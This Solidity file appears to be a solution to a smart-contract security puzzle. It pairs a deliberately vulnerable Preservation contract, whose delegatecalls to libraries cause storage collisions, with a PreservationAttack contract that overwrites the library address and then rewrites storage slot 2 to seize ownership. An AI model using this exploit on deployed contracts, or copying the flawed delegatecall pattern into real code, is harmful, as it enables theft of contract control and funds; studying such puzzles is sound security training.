pragma solidity ^0.4.24;


contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
      timeZone1Library = _timeZone1LibraryAddress;
      timeZone2Library = _timeZone2LibraryAddress;
      owner = msg.sender;
  }


  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}



contract PreservationAttack {

    Preservation victim;
    uint storedTime;

    constructor(address _victim) public {
        victim = Preservation(_victim);

    }

    function attack() external returns(bool success, address owner) {
        uint myAddrAsUint = uint256(address(this));
        // set the attack contract as the first time library
        victim.setSecondTime(myAddrAsUint);
        // now when running the code, it should invoke *our* setTime function
        victim.setFirstTime(myAddrAsUint);

        owner = victim.owner();
        return (true, owner);
    }

    function setTime(uint _time) public {
        bytes32 key = bytes32(2); //owner is stored in slot 2
        bytes32 value = bytes32(_time);

        assembly {
            sstore(key, value)
        }
    }

}
